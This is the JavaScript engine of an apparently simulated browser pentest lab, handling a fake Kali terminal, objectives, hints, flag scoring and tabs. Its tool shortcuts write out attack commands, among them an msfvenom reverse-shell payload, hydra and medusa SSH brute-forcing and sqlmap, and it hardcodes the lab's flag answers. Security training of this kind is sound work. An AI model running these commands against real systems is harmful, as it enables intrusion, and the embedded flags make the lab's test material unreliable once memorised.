// Lab Engine - Interactive Terminal and Learning System
class LabEngine {
    constructor() {
        this.currentLab = null;
        this.terminalHistory = [];
        this.historyIndex = -1;
        this.currentDirectory = '/root';
        this.objectives = [];
        this.completedObjectives = 0;
        this.targetIP = '10.10.10.50';
        this.vmIP = '10.10.10.100';
        this.discoveredPorts = [];
        this.discoveredServices = [];
        this.flags = [];
        this.tabs = [{ id: 1, name: 'Terminal 1', history: [], output: '' }];
        this.activeTab = 1;
        this.nextTabId = 2;
        this.hints = {
            1: "Start with a basic port scan using nmap",
            2: "Look for web services on common ports (80, 443, 8080)",
            3: "Directory enumeration might reveal hidden paths",
            4: "Check for default credentials or SQL injection",
            5: "Look for configuration files or database dumps"
        };
        
        this.initializeTerminal();
        this.loadLabScenario();
    }

    initializeTerminal() {
        const terminalInput = document.getElementById('terminalInput');
        const terminalOutput = document.getElementById('terminalOutput');
        
        terminalInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.executeCommand(terminalInput.value);
                terminalInput.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                this.navigateHistory(-1);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                this.navigateHistory(1);
            } else if (e.key === 'Tab') {
                e.preventDefault();
                this.autoComplete(terminalInput.value);
            }
        });

        // Focus terminal input
        terminalInput.focus();
        
        // Update terminal prompt to use VFS current directory
        const prompt = document.getElementById('terminalPrompt');
        if (prompt) {
            if (window.vfs) {
                prompt.textContent = `root@kali:${window.vfs.currentDir}# `;
            } else {
                prompt.textContent = 'root@kali:/root# ';
            }
        }
        
        // Welcome message
        this.addOutput('Welcome to AbidHack Arena Virtual Lab Environment', 'success');
        this.addOutput('Type "help" for available commands', 'info');
        this.addOutput('', 'normal');
    }

    loadLabScenario() {
        const scenario = localStorage.getItem('current_scenario');
        if (scenario) {
            const labData = JSON.parse(scenario);
            this.currentLab = labData;
            this.setupLabEnvironment(labData);
        } else {
            // Default beginner lab
            this.setupDefaultLab();
        }
    }

    setupLabEnvironment(labData) {
        document.getElementById('vmName').textContent = 'Kali Linux';
        document.getElementById('targetIP').textContent = this.targetIP;
        document.getElementById('targetOS').textContent = 'Linux Ubuntu';
        document.getElementById('labDifficulty').textContent = labData.difficulty || 'Beginner';
        
        this.addOutput(`Lab Environment: ${labData.name}`, 'success');
        this.addOutput(`Target IP: ${this.targetIP}`, 'info');
        this.addOutput(`Your IP: ${this.vmIP}`, 'info');
        this.addOutput('Lab objectives loaded. Check the objectives panel.', 'info');
        this.addOutput('', 'normal');
    }

    setupDefaultLab() {
        this.addOutput('Default Web Application Security Lab loaded', 'success');
        this.addOutput(`Target IP: ${this.targetIP}`, 'info');
        this.addOutput(`Your IP: ${this.vmIP}`, 'info');
        this.addOutput('', 'normal');
    }

    executeCommand(command) {
        if (!command.trim()) return;
        
        // Clear previous output before executing new command
        this.clearTerminal();
        
        // Add to history
        this.terminalHistory.push(command);
        this.historyIndex = this.terminalHistory.length;
        
        // Display command
        this.addOutput(`root@kali:${window.vfs ? window.vfs.currentDir : '/root'}# ${command}`, 'command');
        
        // Parse command
        const args = command.trim().split(' ');
        const cmd = args[0].toLowerCase();
        const cmdArgs = args.slice(1);
        
        // Check if command loader is available
        if (!window.commandLoader) {
            this.addOutput('Command system not loaded. Please refresh the page.', 'error');
            return;
        }
        
        // Execute command using the new modular system
        const result = window.commandLoader.executeCommand(cmd, cmdArgs, this);
        
        if (result) {
            this.addOutput(result, 'normal');
            
            // Check for objectives based on command
            this.checkCommandObjectives(cmd);
        }
        
        this.addOutput('', 'normal');
    }
    
    checkCommandObjectives(cmd) {
        // Map commands to objectives
        const commandObjectives = {
            'nmap': 'reconnaissance',
            'ping': 'reconnaissance',
            'gobuster': 'enumeration',
            'dirb': 'enumeration',
            'nikto': 'enumeration',
            'sqlmap': 'vulnerability',
            'searchsploit': 'vulnerability',
            'msfconsole': 'exploitation',
            'hydra': 'exploitation',
            'john': 'password_crack',
            'hashcat': 'password_crack'
        };
        
        if (commandObjectives[cmd]) {
            this.checkObjective(commandObjectives[cmd]);
        }
    }

    showNetworkConfig() {
        const ifconfigOutput = `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet ${this.vmIP}  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)
        RX packets 1234  bytes 567890 (554.5 KiB)
        TX packets 987  bytes 123456 (120.5 KiB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        TX packets 0  bytes 0 (0.0 B)`;
        
        this.addOutput(ifconfigOutput, 'normal');
    }

    // Directory listing is now handled by enhanced commands

    changeDirectory(dir) {
        // This is now handled by the command loader
        // Keep this method for compatibility
        return window.vfs.changeDirectory(dir);
    }

    // File reading is now handled by enhanced commands

    // All command implementations are now in enhanced-commands.js

    submitFlag(flag) {
        if (!flag) {
            this.addOutput('Usage: flag <flag_value>', 'error');
            return;
        }
        
        const validFlags = [
            'CYBER{SQL_1nj3ct10n_m4st3r}',
            'CYBER{d1r3ct0ry_tr4v3rs4l}',
            'CYBER{w3b_4pp_pwn3d}',
            'CYBER{r00t_4cc3ss_gr4nt3d}',
            'CYBER{p4ssw0rd_cr4ck3d}'
        ];
        
        if (validFlags.includes(flag)) {
            this.addOutput(`✅ Correct flag submitted: ${flag}`, 'success');
            this.addOutput(`🎉 You earned 50 XP!`, 'success');
            
            if (typeof addUserXP === 'function') {
                addUserXP(50);
            }
            
            this.checkObjective('flag_capture');
        } else {
            this.addOutput(`❌ Incorrect flag: ${flag}`, 'error');
            this.addOutput('Keep trying! Check your enumeration results.', 'info');
        }
    }

    checkObjective(type) {
        const objectives = {
            'reconnaissance': 0,
            'enumeration': 1,
            'vulnerability': 2,
            'exploitation': 3,
            'flag_capture': 4
        };
        
        if (objectives.hasOwnProperty(type)) {
            const objIndex = objectives[type];
            const checkbox = document.getElementById(`obj${objIndex + 1}`);
            if (checkbox && !checkbox.checked) {
                checkbox.checked = true;
                this.completedObjectives++;
                this.updateProgress();
                this.addOutput(`✅ Objective completed: ${this.getObjectiveText(objIndex)}`, 'success');
            }
        }
    }

    getObjectiveText(index) {
        const texts = [
            'Perform network reconnaissance',
            'Identify open ports and services',
            'Find web application vulnerabilities',
            'Exploit identified vulnerabilities',
            'Capture the flag'
        ];
        return texts[index] || 'Unknown objective';
    }

    updateProgress() {
        const progress = (this.completedObjectives / 5) * 100;
        document.getElementById('labProgress').style.width = `${progress}%`;
        document.getElementById('progressText').textContent = `${this.completedObjectives}/5 objectives completed`;
        
        if (this.completedObjectives === 5) {
            this.addOutput('🎉 Congratulations! All objectives completed!', 'success');
            this.addOutput('🏆 Lab completed successfully!', 'success');
            
            if (typeof addUserXP === 'function') {
                addUserXP(100);
            }
        }
    }

    addOutput(text, type = 'normal') {
        const output = document.getElementById('terminalOutput');
        const line = document.createElement('div');
        line.className = `terminal-line ${type}`;
        line.textContent = text;
        output.appendChild(line);
        
        // Auto-scroll to bottom
        const terminalBody = document.getElementById('terminalBody');
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }

    navigateHistory(direction) {
        const input = document.getElementById('terminalInput');
        
        if (direction === -1 && this.historyIndex > 0) {
            this.historyIndex--;
            input.value = this.terminalHistory[this.historyIndex];
        } else if (direction === 1 && this.historyIndex < this.terminalHistory.length - 1) {
            this.historyIndex++;
            input.value = this.terminalHistory[this.historyIndex];
        } else if (direction === 1 && this.historyIndex === this.terminalHistory.length - 1) {
            this.historyIndex = this.terminalHistory.length;
            input.value = '';
        }
    }

    autoComplete(partial) {
        const commands = [
            'help', 'ls', 'cd', 'pwd', 'cat', 'clear', 'nmap', 'gobuster', 'sqlmap',
            'curl', 'nc', 'netcat', 'msfconsole', 'john', 'hashcat', 'hydra',
            'nikto', 'dirb', 'searchsploit', 'whoami', 'id', 'uname', 'ifconfig', 'ping', 'flag'
        ];
        
        const matches = commands.filter(cmd => cmd.startsWith(partial.toLowerCase()));
        
        if (matches.length === 1) {
            document.getElementById('terminalInput').value = matches[0];
        } else if (matches.length > 1) {
            this.addOutput(`Available commands: ${matches.join(', ')}`, 'info');
        }
    }

    clearTerminal() {
        document.getElementById('terminalOutput').innerHTML = '';
    }
}

// Tool execution functions
function runTool(toolName) {
    const input = document.getElementById('terminalInput');
    const toolCommands = {
        'nmap': `nmap -sV ${labEngine.targetIP}`,
        'masscan': `masscan -p1-65535 ${labEngine.targetIP} --rate=1000`,
        'rustscan': `rustscan -a ${labEngine.targetIP}`,
        'gobuster': `gobuster dir -u http://${labEngine.targetIP} -w /usr/share/wordlists/common.txt`,
        'burpsuite': 'burpsuite',
        'sqlmap': `sqlmap -u "http://${labEngine.targetIP}/login.php" --forms`,
        'nikto': `nikto -h ${labEngine.targetIP}`,
        'dirb': `dirb http://${labEngine.targetIP}`,
        'metasploit': 'msfconsole',
        'msfvenom': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f elf',
        'searchsploit': 'searchsploit apache',
        'exploit-db': 'exploit-db',
        'john': 'john hashes.txt',
        'hashcat': 'hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt',
        'hydra': `hydra -l admin -P /usr/share/wordlists/rockyou.txt ${labEngine.targetIP} ssh`,
        'medusa': `medusa -h ${labEngine.targetIP} -u admin -P /usr/share/wordlists/rockyou.txt -M ssh`
    };
    
    if (toolCommands[toolName]) {
        input.value = toolCommands[toolName];
        input.focus();
    }
}

// Panel control functions
function togglePanel(panelName) {
    const content = document.getElementById(`${panelName}Content`);
    const button = event.target;
    
    if (content.style.display === 'none') {
        content.style.display = 'block';
        button.textContent = '−';
    } else {
        content.style.display = 'none';
        button.textContent = '+';
    }
}

function showHint(hintNumber) {
    if (labEngine.hints[hintNumber]) {
        labEngine.addOutput(`💡 Hint ${hintNumber}: ${labEngine.hints[hintNumber]}`, 'info');
    }
}

// Lab control functions
function resetLab() {
    if (confirm('Are you sure you want to reset the lab? All progress will be lost.')) {
        location.reload();
    }
}

function saveLab() {
    const labState = {
        completedObjectives: labEngine.completedObjectives,
        discoveredPorts: labEngine.discoveredPorts,
        discoveredServices: labEngine.discoveredServices,
        flags: labEngine.flags,
        terminalHistory: labEngine.terminalHistory
    };
    
    localStorage.setItem('lab_state', JSON.stringify(labState));
    labEngine.addOutput('Lab state saved successfully!', 'success');
}

function exitLab() {
    if (confirm('Are you sure you want to exit the lab?')) {
        window.location.href = 'practical-labs.html';
    }
}

function clearTerminal() {
    labEngine.clearTerminal();
}

function fullscreenTerminal() {
    const terminal = document.querySelector('.terminal-container');
    if (terminal.requestFullscreen) {
        terminal.requestFullscreen();
    }
}

// Initialize lab engine when page loads
let labEngine;
document.addEventListener('DOMContentLoaded', function() {
    // Wait for command loader to be ready
    const checkCommandLoader = () => {
        if (window.commandLoader) {
            labEngine = new LabEngine();
            console.log('Lab engine initialized');
        } else {
            setTimeout(checkCommandLoader, 100);
        }
    };
    checkCommandLoader();
});


// Terminal Tab Management
function addNewTab() {
    const tabId = labEngine.nextTabId++;
    labEngine.tabs.push({ id: tabId, name: `Terminal ${tabId}`, history: [], output: '' });
    
    const tabsContainer = document.querySelector('.terminal-tabs');
    const newTabBtn = document.querySelector('.new-tab-btn');
    
    const tab = document.createElement('div');
    tab.className = 'tab';
    tab.setAttribute('data-tab', tabId);
    tab.onclick = () => switchTab(tabId);
    tab.innerHTML = `
        <span class="tab-icon">💻</span>
        <span class="tab-name">Terminal ${tabId}</span>
        <span class="tab-close" onclick="closeTab(event, ${tabId})">×</span>
    `;
    
    applyTabColor(tab, tabId);
    tabsContainer.insertBefore(tab, newTabBtn);
    switchTab(tabId);
}

function switchTab(tabId) {
    // Save current tab output
    const currentTab = labEngine.tabs.find(t => t.id === labEngine.activeTab);
    if (currentTab) {
        currentTab.output = document.getElementById('terminalOutput').innerHTML;
    }
    
    // Switch to new tab
    labEngine.activeTab = tabId;
    
    // Update tab UI
    document.querySelectorAll('.tab').forEach(tab => {
        tab.classList.remove('active');
        if (parseInt(tab.getAttribute('data-tab')) === tabId) {
            tab.classList.add('active');
        }
    });
    
    // Load tab output
    const newTab = labEngine.tabs.find(t => t.id === tabId);
    if (newTab) {
        document.getElementById('terminalOutput').innerHTML = newTab.output;
    }
    
    // Focus input
    document.getElementById('terminalInput').focus();
}

function closeTab(event, tabId) {
    event.stopPropagation();
    
    if (labEngine.tabs.length === 1) {
        alert('Cannot close the last terminal tab!');
        return;
    }
    
    // Remove tab
    labEngine.tabs = labEngine.tabs.filter(t => t.id !== tabId);
    document.querySelector(`[data-tab="${tabId}"]`).remove();
    
    // Switch to first tab if closing active tab
    if (labEngine.activeTab === tabId) {
        switchTab(labEngine.tabs[0].id);
    }
}


// Tab color management
const tabColors = [
    { border: '#00ff41', bg: 'rgba(0, 255, 65, 0.15)', glow: 'rgba(0, 255, 65, 0.3)', text: '#00ff41' },
    { border: '#0066ff', bg: 'rgba(0, 102, 255, 0.15)', glow: 'rgba(0, 102, 255, 0.3)', text: '#00d4ff' },
    { border: '#ff00ff', bg: 'rgba(255, 0, 255, 0.15)', glow: 'rgba(255, 0, 255, 0.3)', text: '#ff00ff' },
    { border: '#ffaa00', bg: 'rgba(255, 170, 0, 0.15)', glow: 'rgba(255, 170, 0, 0.3)', text: '#ffaa00' },
    { border: '#ff0066', bg: 'rgba(255, 0, 102, 0.15)', glow: 'rgba(255, 0, 102, 0.3)', text: '#ff0066' },
    { border: '#00ffff', bg: 'rgba(0, 255, 255, 0.15)', glow: 'rgba(0, 255, 255, 0.3)', text: '#00ffff' }
];

function getTabColor(tabId) {
    return tabColors[(tabId - 1) % tabColors.length];
}

function applyTabColor(tabElement, tabId) {
    const color = getTabColor(tabId);
    tabElement.style.setProperty('--tab-border', color.border);
    tabElement.style.setProperty('--tab-bg', color.bg);
    tabElement.style.setProperty('--tab-glow', color.glow);
    tabElement.style.setProperty('--tab-text', color.text);
}
